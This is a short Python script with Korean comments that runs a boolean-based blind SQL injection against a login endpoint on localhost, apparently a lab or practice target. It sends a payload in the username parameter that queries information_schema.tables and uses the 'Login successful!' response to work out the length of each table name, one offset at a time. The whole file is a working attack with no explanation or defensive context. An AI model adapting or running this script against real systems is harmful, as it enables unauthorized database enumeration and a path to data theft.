import requests

# 대상 URL
url = "http://127.0.0.1:25576/login"

# 테이블 이름의 길이를 추측하는 함수
def get_all_table_name_lengths():
    lengths = []
    offset = 0  # 시작 위치
    
    while True:
        found = False  # 테이블 확인 여부
        for length in range(1, 100):  # 테이블 이름 길이는 1~99로 가정
            # GET 요청에 사용될 페이로드
            payload = (
                f"' OR (SELECT LENGTH(table_name) FROM information_schema.tables "
                f"WHERE table_schema = DATABASE() LIMIT 1 OFFSET {offset}) = {length}-- "
            )
            params = {
                "username": payload,
                "password": "test"  # 임의의 비밀번호
            }
            
            # HTTP GET 요청
            response = requests.get(url, params=params)
            
            # 응답 확인
            if "Login successful!" in response.text:
                print(f"OFFSET {offset} 테이블 이름의 길이: {length}")
                lengths.append(length)
                found = True
                break
        
        # 더 이상 테이블이 없으면 종료
        if not found:
            break
        
        # 다음 테이블로 이동
        offset += 1
    
    return lengths

# 실행
table_lengths = get_all_table_name_lengths()
print("All Tables:", table_lengths)
